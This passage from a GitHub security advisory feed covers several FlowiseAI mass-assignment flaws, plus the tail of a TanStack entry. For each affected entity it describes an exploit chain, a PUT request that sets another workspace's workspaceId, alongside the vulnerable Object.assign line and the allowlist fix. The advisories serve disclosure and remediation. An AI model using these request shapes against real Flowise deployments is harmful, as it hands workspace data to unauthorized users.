<li>Upstream fix coordinated with Seroval maintainers <a href="https://github.com/lxsmnsyc/seroval">https://github.com/lxsmnsyc/seroval</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/TanStack/router/security/advisories/GHSA-9m65-766c-r333">https://github.com/TanStack/router/security/advisories/GHSA-9m65-766c-r333</a></li>
<li><a href="https://github.com/lxsmnsyc/seroval/security/advisories">https://github.com/lxsmnsyc/seroval/security/advisories</a></li>
<li><a href="https://github.com/advisories/GHSA-9m65-766c-r333">https://github.com/advisories/GHSA-9m65-766c-r333</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9m65-766c-r333</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-14T16:37:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: Evaluator create+update mass-assignment allows cross-workspace evaluator takeover]]></title>
        <id>https://github.com/advisories/GHSA-wxrr-jp8m-qq7f</id>
        <link href="https://github.com/advisories/GHSA-wxrr-jp8m-qq7f"/>
        <updated>2026-05-14T16:19:53.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Mass assignment via <code>Object.assign(entity, body)</code> -&gt; client-controlled <code>workspaceId</code> (and on create, <code>id</code>) overwritten on the Evaluator entity -&gt; cross-workspace data takeover and IDOR.
<strong>File:</strong> <code>packages/server/src/Interface.Evaluation.ts</code>
<strong>Root cause:</strong> The Evaluator controller/service constructs a <code>new Evaluator()</code> and copies the request body into it via <code>Object.assign(...)</code> without an explicit field allowlist. The request body therefore can include <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, <code>updatedDate</code>. The server only rebinds <em>some</em> of these after the assign (e.g. on create, it overwrites <code>workspaceId</code> but not <code>id</code>; on update, it overwrites <code>id</code> but not <code>workspaceId</code>). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the evaluator entity's sibling controllers and as <code>DocumentStore</code> before it was patched in commit 840d2ae.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>packages/server/src/Interface.Evaluation.ts</code></p>
<pre><code class="language-ts">// at line 85
Object.assign(newEvaluator, body)       // &lt;-- BUG: body.id, body.workspaceId, body.createdDate, body.updatedDate accepted
</code></pre>
<p><strong>Why it's wrong:</strong> <code>Object.assign(target, source)</code> copies every own enumerable property of <code>source</code> onto <code>target</code>. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so <code>workspaceId</code> set in the request body lands as the new <code>workspaceId</code> of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.</li>
<li>Attacker creates a evaluator in workspace A via the documented API (or reuses an existing one they own). They note its entity <code>id</code>.</li>
<li>Attacker issues a <code>PUT /api/v1/evaluators/&lt;id&gt;</code> (or equivalent endpoint) with a JSON body that includes <code>"workspaceId": "&lt;workspace-B-id&gt;"</code> (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.</li>
<li>The controller calls <code>Object.assign(updateEntity, body)</code>. The body's <code>workspaceId</code> overwrites the entity's <code>workspaceId</code> field. The persistence layer commits the row.</li>
<li>Final state: the evaluator row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> High. Cross-workspace boundary violation by any authenticated workspace member.
<strong>Attacker capability:</strong> Any authenticated user with permission to update a evaluator can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Evaluators score model outputs and can be moved into another workspace via <code>workspaceId</code> overwrite, making the evaluator (and its scoring rubric) appear there.
<strong>Preconditions:</strong> Authenticated session with edit permission for the source evaluator. No second factor required. Workspace UUIDs are exposed via the <code>/api/v1/workspaces</code> listing or via any cross-referenced object's <code>workspaceId</code> field, so target enumeration is trivial.
<strong>Differential:</strong> PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the <code>workspaceId</code> field; vulnerable build accepts it and persists it.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Already fixed in PR <a href="https://github.com/FlowiseAI/Flowise/pull/6050">https://github.com/FlowiseAI/Flowise/pull/6050</a> (allowlist pattern applied).</p>
<pre><code class="language-ts">// Allowlist pattern (matches commit 840d2ae for DocumentStore):
const updatedEvaluator = new Evaluator()
if (body.&lt;allowed_field_1&gt; !== undefined) updatedEvaluator.&lt;allowed_field_1&gt; = body.&lt;allowed_field_1&gt;
if (body.&lt;allowed_field_2&gt; !== undefined) updatedEvaluator.&lt;allowed_field_2&gt; = body.&lt;allowed_field_2&gt;
// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.
</code></pre>
<p>Regression tests should assert that a request body containing <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, or <code>updatedDate</code> is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wxrr-jp8m-qq7f">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wxrr-jp8m-qq7f</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6050">https://github.com/FlowiseAI/Flowise/pull/6050</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/dc07f4062b852033554543a3cff3daf3433b0dac">https://github.com/FlowiseAI/Flowise/commit/dc07f4062b852033554543a3cff3daf3433b0dac</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-wxrr-jp8m-qq7f">https://github.com/advisories/GHSA-wxrr-jp8m-qq7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wxrr-jp8m-qq7f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:19:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: Evaluation create+update mass-assignment allows cross-workspace evaluation takeover]]></title>
        <id>https://github.com/advisories/GHSA-mq53-pc65-wjc4</id>
        <link href="https://github.com/advisories/GHSA-mq53-pc65-wjc4"/>
        <updated>2026-05-14T16:19:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Mass assignment via <code>Object.assign(entity, body)</code> -&gt; client-controlled <code>workspaceId</code> (and on create, <code>id</code>) overwritten on the Evaluation entity -&gt; cross-workspace data takeover and IDOR.
<strong>File:</strong> <code>packages/server/src/services/evaluations/index.ts</code>
<strong>Root cause:</strong> The Evaluation controller/service constructs a <code>new Evaluation()</code> and copies the request body into it via <code>Object.assign(...)</code> without an explicit field allowlist. The request body therefore can include <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, <code>updatedDate</code>. The server only rebinds <em>some</em> of these after the assign (e.g. on create, it overwrites <code>workspaceId</code> but not <code>id</code>; on update, it overwrites <code>id</code> but not <code>workspaceId</code>). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the evaluation entity's sibling controllers and as <code>DocumentStore</code> before it was patched in commit 840d2ae.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>packages/server/src/services/evaluations/index.ts</code></p>
<pre><code class="language-ts">// at line 69
Object.assign(newEvaluation, body)      // &lt;-- BUG: body.id, body.workspaceId, body.createdDate, body.updatedDate accepted
</code></pre>
<p><strong>Why it's wrong:</strong> <code>Object.assign(target, source)</code> copies every own enumerable property of <code>source</code> onto <code>target</code>. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so <code>workspaceId</code> set in the request body lands as the new <code>workspaceId</code> of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.</li>
<li>Attacker creates a evaluation in workspace A via the documented API (or reuses an existing one they own). They note its entity <code>id</code>.</li>
<li>Attacker issues a <code>PUT /api/v1/evaluations/&lt;id&gt;</code> (or equivalent endpoint) with a JSON body that includes <code>"workspaceId": "&lt;workspace-B-id&gt;"</code> (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.</li>
<li>The controller calls <code>Object.assign(updateEntity, body)</code>. The body's <code>workspaceId</code> overwrites the entity's <code>workspaceId</code> field. The persistence layer commits the row.</li>
<li>Final state: the evaluation row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> High. Cross-workspace boundary violation by any authenticated workspace member.
<strong>Attacker capability:</strong> Any authenticated user with permission to update a evaluation can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Evaluation runs (which may include captured prompts, model outputs, scoring data) can be moved cross-workspace via <code>workspaceId</code> overwrite, exposing the data to attacker workspace members.
<strong>Preconditions:</strong> Authenticated session with edit permission for the source evaluation. No second factor required. Workspace UUIDs are exposed via the <code>/api/v1/workspaces</code> listing or via any cross-referenced object's <code>workspaceId</code> field, so target enumeration is trivial.
<strong>Differential:</strong> PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the <code>workspaceId</code> field; vulnerable build accepts it and persists it.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Already fixed in PR <a href="https://github.com/FlowiseAI/Flowise/pull/6050">https://github.com/FlowiseAI/Flowise/pull/6050</a> (allowlist pattern applied).</p>
<pre><code class="language-ts">// Allowlist pattern (matches commit 840d2ae for DocumentStore):
const updatedEvaluation = new Evaluation()
if (body.&lt;allowed_field_1&gt; !== undefined) updatedEvaluation.&lt;allowed_field_1&gt; = body.&lt;allowed_field_1&gt;
if (body.&lt;allowed_field_2&gt; !== undefined) updatedEvaluation.&lt;allowed_field_2&gt; = body.&lt;allowed_field_2&gt;
// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.
</code></pre>
<p>Regression tests should assert that a request body containing <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, or <code>updatedDate</code> is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-mq53-pc65-wjc4">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-mq53-pc65-wjc4</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6050">https://github.com/FlowiseAI/Flowise/pull/6050</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/dc07f4062b852033554543a3cff3daf3433b0dac">https://github.com/FlowiseAI/Flowise/commit/dc07f4062b852033554543a3cff3daf3433b0dac</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-mq53-pc65-wjc4">https://github.com/advisories/GHSA-mq53-pc65-wjc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq53-pc65-wjc4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:19:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: DatasetRow create+update mass-assignment allows cross-workspace row takeover]]></title>
        <id>https://github.com/advisories/GHSA-7j65-65cr-6644</id>
        <link href="https://github.com/advisories/GHSA-7j65-65cr-6644"/>
        <updated>2026-05-14T16:19:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Mass assignment via <code>Object.assign(entity, body)</code> -&gt; client-controlled <code>workspaceId</code> (and on create, <code>id</code>) overwritten on the DatasetRow entity -&gt; cross-workspace data takeover and IDOR.
<strong>File:</strong> <code>packages/server/src/services/dataset/index.ts</code>
<strong>Root cause:</strong> The DatasetRow controller/service constructs a <code>new DatasetRow()</code> and copies the request body into it via <code>Object.assign(...)</code> without an explicit field allowlist. The request body therefore can include <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, <code>updatedDate</code>. The server only rebinds <em>some</em> of these after the assign (e.g. on create, it overwrites <code>workspaceId</code> but not <code>id</code>; on update, it overwrites <code>id</code> but not <code>workspaceId</code>). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the datasetrow entity's sibling controllers and as <code>DocumentStore</code> before it was patched in commit 840d2ae.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>packages/server/src/services/dataset/index.ts</code></p>
<pre><code class="language-ts">// create (line 274) and update (line 315)
Object.assign(newRow, rowBody)          // &lt;-- BUG: rowBody.id, rowBody.datasetId accepted
</code></pre>
<p><strong>Why it's wrong:</strong> <code>Object.assign(target, source)</code> copies every own enumerable property of <code>source</code> onto <code>target</code>. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so <code>workspaceId</code> set in the request body lands as the new <code>workspaceId</code> of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.</li>
<li>Attacker creates a datasetrow in workspace A via the documented API (or reuses an existing one they own). They note its entity <code>id</code>.</li>
<li>Attacker issues a <code>PUT /api/v1/datasetrows/&lt;id&gt;</code> (or equivalent endpoint) with a JSON body that includes <code>"workspaceId": "&lt;workspace-B-id&gt;"</code> (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.</li>
<li>The controller calls <code>Object.assign(updateEntity, body)</code>. The body's <code>workspaceId</code> overwrites the entity's <code>workspaceId</code> field. The persistence layer commits the row.</li>
<li>Final state: the datasetrow row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> High. Cross-workspace boundary violation by any authenticated workspace member.
<strong>Attacker capability:</strong> Any authenticated user with permission to update a datasetrow can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). DatasetRows hold individual training/evaluation records. The mass assignment lets a member rebind a row to a Dataset in another workspace via <code>datasetId</code>, exposing the row content to the destination workspace.
<strong>Preconditions:</strong> Authenticated session with edit permission for the source datasetrow. No second factor required. Workspace UUIDs are exposed via the <code>/api/v1/workspaces</code> listing or via any cross-referenced object's <code>workspaceId</code> field, so target enumeration is trivial.
<strong>Differential:</strong> PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the <code>workspaceId</code> field; vulnerable build accepts it and persists it.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Already fixed in PR <a href="https://github.com/FlowiseAI/Flowise/pull/6051">https://github.com/FlowiseAI/Flowise/pull/6051</a> (allowlist pattern applied).</p>
<pre><code class="language-ts">// Allowlist pattern (matches commit 840d2ae for DocumentStore):
const updatedDatasetRow = new DatasetRow()
if (body.&lt;allowed_field_1&gt; !== undefined) updatedDatasetRow.&lt;allowed_field_1&gt; = body.&lt;allowed_field_1&gt;
if (body.&lt;allowed_field_2&gt; !== undefined) updatedDatasetRow.&lt;allowed_field_2&gt; = body.&lt;allowed_field_2&gt;
// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.
</code></pre>
<p>Regression tests should assert that a request body containing <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, or <code>updatedDate</code> is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7j65-65cr-6644">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7j65-65cr-6644</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6051">https://github.com/FlowiseAI/Flowise/pull/6051</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/49a2259bf2a6b4f3d4b50813cb5161cee0d40040">https://github.com/FlowiseAI/Flowise/commit/49a2259bf2a6b4f3d4b50813cb5161cee0d40040</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-7j65-65cr-6644">https://github.com/advisories/GHSA-7j65-65cr-6644</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j65-65cr-6644</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:19:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: Dataset create+update mass-assignment allows cross-workspace dataset takeover]]></title>
        <id>https://github.com/advisories/GHSA-5h9v-837x-m97r</id>
        <link href="https://github.com/advisories/GHSA-5h9v-837x-m97r"/>
        <updated>2026-05-14T16:19:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Mass assignment via <code>Object.assign(entity, body)</code> -&gt; client-controlled <code>workspaceId</code> (and on create, <code>id</code>) overwritten on the Dataset entity -&gt; cross-workspace data takeover and IDOR.
<strong>File:</strong> <code>packages/server/src/services/dataset/index.ts</code>
<strong>Root cause:</strong> The Dataset controller/service constructs a <code>new Dataset()</code> and copies the request body into it via <code>Object.assign(...)</code> without an explicit field allowlist. The request body therefore can include <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, <code>updatedDate</code>. The server only rebinds <em>some</em> of these after the assign (e.g. on create, it overwrites <code>workspaceId</code> but not <code>id</code>; on update, it overwrites <code>id</code> but not <code>workspaceId</code>). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the dataset entity's sibling controllers and as <code>DocumentStore</code> before it was patched in commit 840d2ae.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>packages/server/src/services/dataset/index.ts</code></p>
<pre><code class="language-ts">// create (line 203) and update (line 226)
Object.assign(newDataset, body)         // &lt;-- BUG: body.id, body.workspaceId accepted
</code></pre>
<p><strong>Why it's wrong:</strong> <code>Object.assign(target, source)</code> copies every own enumerable property of <code>source</code> onto <code>target</code>. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so <code>workspaceId</code> set in the request body lands as the new <code>workspaceId</code> of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.</li>
<li>Attacker creates a dataset in workspace A via the documented API (or reuses an existing one they own). They note its entity <code>id</code>.</li>
<li>Attacker issues a <code>PUT /api/v1/datasets/&lt;id&gt;</code> (or equivalent endpoint) with a JSON body that includes <code>"workspaceId": "&lt;workspace-B-id&gt;"</code> (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.</li>
<li>The controller calls <code>Object.assign(updateEntity, body)</code>. The body's <code>workspaceId</code> overwrites the entity's <code>workspaceId</code> field. The persistence layer commits the row.</li>
<li>Final state: the dataset row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> High. Cross-workspace boundary violation by any authenticated workspace member.
<strong>Attacker capability:</strong> Any authenticated user with permission to update a dataset can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Datasets hold training / evaluation data scoped to a workspace. Moving a Dataset across workspaces via <code>workspaceId</code> overwrite exposes the dataset (rows, schema, references) to the destination workspace.
<strong>Preconditions:</strong> Authenticated session with edit permission for the source dataset. No second factor required. Workspace UUIDs are exposed via the <code>/api/v1/workspaces</code> listing or via any cross-referenced object's <code>workspaceId</code> field, so target enumeration is trivial.
<strong>Differential:</strong> PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the <code>workspaceId</code> field; vulnerable build accepts it and persists it.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Already fixed in PR <a href="https://github.com/FlowiseAI/Flowise/pull/6051">https://github.com/FlowiseAI/Flowise/pull/6051</a> (allowlist pattern applied).</p>
<pre><code class="language-ts">// Allowlist pattern (matches commit 840d2ae for DocumentStore):
const updatedDataset = new Dataset()
if (body.&lt;allowed_field_1&gt; !== undefined) updatedDataset.&lt;allowed_field_1&gt; = body.&lt;allowed_field_1&gt;
if (body.&lt;allowed_field_2&gt; !== undefined) updatedDataset.&lt;allowed_field_2&gt; = body.&lt;allowed_field_2&gt;
// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.
</code></pre>
<p>Regression tests should assert that a request body containing <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, or <code>updatedDate</code> is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5h9v-837x-m97r">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5h9v-837x-m97r</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6051">https://github.com/FlowiseAI/Flowise/pull/6051</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/49a2259bf2a6b4f3d4b50813cb5161cee0d40040">https://github.com/FlowiseAI/Flowise/commit/49a2259bf2a6b4f3d4b50813cb5161cee0d40040</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5h9v-837x-m97r">https://github.com/advisories/GHSA-5h9v-837x-m97r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5h9v-837x-m97r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:19:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: CustomTemplate create+update mass-assignment allows cross-workspace template takeover]]></title>
        <id>https://github.com/advisories/GHSA-728h-4mwj-f2p4</id>
        <link href="https://github.com/advisories/GHSA-728h-4mwj-f2p4"/>
        <updated>2026-05-14T16:19:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Mass assignment via <code>Object.assign(entity, body)</code> -&gt; client-controlled <code>workspaceId</code> (and on create, <code>id</code>) overwritten on the CustomTemplate entity -&gt; cross-workspace data takeover and IDOR.
<strong>File:</strong> <code>packages/server/src/services/marketplaces/index.ts</code>
<strong>Root cause:</strong> The CustomTemplate controller/service constructs a <code>new CustomTemplate()</code> and copies the request body into it via <code>Object.assign(...)</code> without an explicit field allowlist. The request body therefore can include <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, <code>updatedDate</code>. The server only rebinds <em>some</em> of these after the assign (e.g. on create, it overwrites <code>workspaceId</code> but not <code>id</code>; on update, it overwrites <code>id</code> but not <code>workspaceId</code>). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the customtemplate entity's sibling controllers and as <code>DocumentStore</code> before it was patched in commit 840d2ae.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>packages/server/src/services/marketplaces/index.ts</code></p>
<pre><code class="language-ts">// at line 211
Object.assign(newTemplate, body)        // &lt;-- BUG: body.id, body.workspaceId accepted
</code></pre>
<p><strong>Why it's wrong:</strong> <code>Object.assign(target, source)</code> copies every own enumerable property of <code>source</code> onto <code>target</code>. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so <code>workspaceId</code> set in the request body lands as the new <code>workspaceId</code> of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.</li>
<li>Attacker creates a customtemplate in workspace A via the documented API (or reuses an existing one they own). They note its entity <code>id</code>.</li>
<li>Attacker issues a <code>PUT /api/v1/customtemplates/&lt;id&gt;</code> (or equivalent endpoint) with a JSON body that includes <code>"workspaceId": "&lt;workspace-B-id&gt;"</code> (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.</li>
<li>The controller calls <code>Object.assign(updateEntity, body)</code>. The body's <code>workspaceId</code> overwrites the entity's <code>workspaceId</code> field. The persistence layer commits the row.</li>
<li>Final state: the customtemplate row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> High. Cross-workspace boundary violation by any authenticated workspace member.
<strong>Attacker capability:</strong> Any authenticated user with permission to update a customtemplate can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). CustomTemplates encode reusable workflow templates scoped to a workspace. Cross-workspace movement via <code>workspaceId</code> overwrite makes the template appear in another workspace's marketplace listing.
<strong>Preconditions:</strong> Authenticated session with edit permission for the source customtemplate. No second factor required. Workspace UUIDs are exposed via the <code>/api/v1/workspaces</code> listing or via any cross-referenced object's <code>workspaceId</code> field, so target enumeration is trivial.
<strong>Differential:</strong> PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the <code>workspaceId</code> field; vulnerable build accepts it and persists it.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Already fixed in PR <a href="https://github.com/FlowiseAI/Flowise/pull/6129">https://github.com/FlowiseAI/Flowise/pull/6129</a> (allowlist pattern applied).</p>
<pre><code class="language-ts">// Allowlist pattern (matches commit 840d2ae for DocumentStore):
const updatedCustomTemplate = new CustomTemplate()
if (body.&lt;allowed_field_1&gt; !== undefined) updatedCustomTemplate.&lt;allowed_field_1&gt; = body.&lt;allowed_field_1&gt;
if (body.&lt;allowed_field_2&gt; !== undefined) updatedCustomTemplate.&lt;allowed_field_2&gt; = body.&lt;allowed_field_2&gt;
// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.
</code></pre>
<p>Regression tests should assert that a request body containing <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, or <code>updatedDate</code> is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-728h-4mwj-f2p4">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-728h-4mwj-f2p4</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6129">https://github.com/FlowiseAI/Flowise/pull/6129</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/f64047bdcf4cbd6a30ec348b9e3f2899ff514e89">https://github.com/FlowiseAI/Flowise/commit/f64047bdcf4cbd6a30ec348b9e3f2899ff514e89</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-728h-4mwj-f2p4">https://github.com/advisories/GHSA-728h-4mwj-f2p4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-728h-4mwj-f2p4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:19:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: Assistant create+update mass-assignment allows cross-workspace assistant takeover]]></title>
        <id>https://github.com/advisories/GHSA-78pr-c5x5-jggc</id>
        <link href="https://github.com/advisories/GHSA-78pr-c5x5-jggc"/>
        <updated>2026-05-14T16:19:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
